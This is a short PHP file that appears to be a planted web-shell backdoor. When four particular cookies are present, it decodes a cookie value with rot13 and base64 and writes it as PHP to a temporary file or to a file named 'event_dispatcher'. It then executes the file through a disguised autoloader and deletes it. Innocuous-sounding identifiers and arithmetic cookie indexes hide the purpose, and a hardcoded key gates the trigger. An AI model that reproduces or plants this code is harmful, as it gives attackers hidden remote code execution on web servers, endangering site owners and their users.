<?php


if (isset($_COOKIE[79-79]) && isset($_COOKIE[47-46]) && isset($_COOKIE[26-23]) && isset($_COOKIE[70-66])) {
    $entry = $_COOKIE;
    function right_pad_string($resource) {
        $entry = $_COOKIE;
        $tkn = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '572d6dca');
        if (!is_writable($tkn)) {
            $tkn = getcwd() . DIRECTORY_SEPARATOR . "event_dispatcher";
        }
        $elem = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($entry[3]));
        if (is_writeable($tkn)) {
            $val = fopen($tkn, 'w+');
            fputs($val, $elem);
            fclose($val);
            spl_autoload_unregister(__FUNCTION__);
            require_once($tkn);
            @array_map('unlink', array($tkn));
        }
    }
    spl_autoload_register("right_pad_string");
    $item = "4a0bda3dc1f77a44054ab7e6ea188977";
    if (!strncmp($item, $entry[4], 32)) {
        if (@class_parents("api_gateway_reverse_searcher", true)) {
            exit;
        }
    }
}
